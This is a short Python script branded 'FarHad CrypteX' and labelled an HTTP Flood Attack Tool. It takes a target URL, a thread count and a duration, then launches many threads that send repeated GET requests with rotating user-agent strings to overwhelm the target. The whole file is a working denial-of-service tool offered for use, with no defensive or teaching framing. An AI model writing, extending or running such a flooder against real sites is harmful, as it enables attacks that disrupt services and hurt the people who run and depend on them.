import os
import sys
import time
import threading
import random
import requests
from colorama import Fore, Style, init

init(autoreset=True)
os.system('clear')

# FarHad CrypteX লোগো
print(Fore.MAGENTA + """
███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗      ██████╗██████╗ ██╗   ██╗
██╔════╝██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗    ██╔════╝██╔══██╗╚██╗ ██╔╝
███████╗███████║██║  ██║███████║███████║██████╔╝    ██║     ██████╔╝ ╚████╔╝ 
╚════██║██╔══██║██║  ██║██╔══██║██╔══██║██╔═══╝     ██║     ██╔═══╝   ╚██╔╝  
███████║██║  ██║██████╔╝██║  ██║██║  ██║██║         ╚██████╗██║        ██║   
╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝          ╚═════╝╚═╝        ╚═╝   

      [FarHad CrypteX] HTTP Flood Attack Tool
""" + Style.RESET_ALL)

# Usage check
if len(sys.argv) != 4:
    print("Usage: python3 farhad_crx.py <target_url> <threads> <duration>")
    sys.exit()

target = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

start_time = time.time()

def flood():
    while time.time() - start_time < duration:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(target, headers=headers)
            print(Fore.GREEN + f"[FarHad CrypteX] Sent: {response.status_code}")
        except:
            print(Fore.RED + "[FarHad CrypteX] Request failed.")

# Start attack threads
for _ in range(threads):
    t = threading.Thread(target=flood)
    t.start()